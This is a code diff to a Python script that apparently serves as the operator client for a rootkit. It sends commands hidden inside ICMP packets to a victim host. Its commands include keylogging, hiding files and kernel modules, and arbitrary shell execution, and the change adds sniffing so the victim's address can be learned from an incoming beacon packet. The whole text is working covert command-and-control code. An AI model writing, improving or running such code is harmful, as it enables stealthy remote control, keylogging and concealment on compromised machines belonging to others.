@@ -1,5 +1,5 @@
 import sys
-from scapy.all import sr1, IP, ICMP
+from scapy.all import sr1, IP, ICMP, sniff
 
 COMMANDS = ["mycat", "keylog", "hide", "unhide", "hidemod", "unhidemod", "randswitch"]
 PWD = "/"
@@ -22,7 +22,7 @@ def send_request(ip, payload):
     elif command not in COMMANDS:
         payload = "shell " + payload
 
-    print(payload)
+    #print(payload)
     
     response = sr1(IP(dst=ip)/ICMP()/payload, timeout=1, verbose=0)
     if response is not None:
@@ -39,8 +39,15 @@ def send_request(ip, payload):
 
 def main():
     if len(sys.argv) != 2:
-        print(f'Usage: {sys.argv[0]} IP')
-    ip = sys.argv[1]
+        while True:
+            packet = sniff(count=1)[0].getlayer(ICMP)
+            if packet is None:
+                continue
+            ip = bytes(packet.payload).decode().strip("\x00").strip()
+            break
+    else:
+        ip = sys.argv[1]
+    print(ip)
     if not send_request(ip, "myecho test_echo"):
         print("Shell: test command got no response, exiting...")
         return
